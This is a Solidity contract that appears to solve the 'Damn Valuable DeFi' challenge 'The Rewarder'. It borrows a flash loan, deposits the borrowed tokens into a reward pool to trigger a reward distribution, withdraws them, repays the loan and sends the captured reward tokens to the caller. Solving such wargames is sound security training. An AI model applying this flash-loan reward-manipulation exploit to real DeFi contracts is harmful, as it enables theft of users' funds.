// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "./AccountingToken.sol";

contract RewardExploit {
    FlashLoanerPool flashPool;
    RewardToken rewardToken;
    TheRewarderPool pool;
    DamnValuableToken token;

    constructor(
        FlashLoanerPool _flashPool,
        TheRewarderPool _pool,
        RewardToken _rewardToken
    ) {
        flashPool = _flashPool;
        pool = _pool;
        rewardToken = _rewardToken;
        token = _flashPool.liquidityToken();

        // Approve the pool to move tokens on this contract's behalf for the deposit function
        token.approve(address(pool), type(uint256).max);
    }

    function exploit() public {
        // 0. Check the max amount that can be borrowed
        uint256 maxLoan = token.balanceOf(address(flashPool));
        // 1. Borrow all DVT tokens
        flashPool.flashLoan(maxLoan);
        // 4. Transfer the reward tokens to the attaker address.
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        // 2. Deposit all DVT tokens to the reward pool. 
        // Since the rewards min duration has passed, rewards will be distributed based on the balance after this deposit.
        // The reward token is directly minted to the msg.sender (i.e. this contract)
        pool.deposit(amount);
        // pool.distributeRewards(); - not needed since already done within the deposit() function
        
        // 3. Withdraw and return the borrowed DVT tokens to the flash pool
        pool.withdraw(amount);
        token.transfer(address(flashPool), amount);
    }
}
